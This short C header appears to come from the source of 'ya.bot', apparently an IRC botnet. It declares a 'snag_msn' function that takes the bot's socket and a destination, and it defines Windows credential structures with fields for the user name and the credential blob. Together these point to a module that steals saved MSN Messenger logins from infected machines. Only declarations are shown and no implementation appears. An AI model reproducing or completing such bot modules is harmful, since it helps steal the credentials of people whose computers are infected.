/*  ya.bot  */

#ifndef NO_SNAGMSN
bool snag_msn(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose);

typedef struct _CREDENTIAL_ATTRIBUTEA
{
	LPSTR Keyword;
	DWORD Flags;
	DWORD ValueSize;
	LPBYTE Value;
} CREDENTIAL_ATTRIBUTEA, *PCREDENTIAL_ATTRIBUTEA;

typedef struct _CREDENTIALA
{
	DWORD Flags;
	DWORD Type;
	LPSTR TargetName;
	LPSTR Comment;
	FILETIME LastWritten;
	DWORD CredentialBlobSize;
	LPBYTE CredentialBlob;
	DWORD Persist;
	DWORD AttributeCount;
	PCREDENTIAL_ATTRIBUTEA Attributes;
	LPSTR TargetAlias;
	LPSTR UserName;
} CREDENTIALA, *PCREDENTIALA;

typedef CREDENTIALA CREDENTIAL;
typedef PCREDENTIALA PCREDENTIAL;
#endif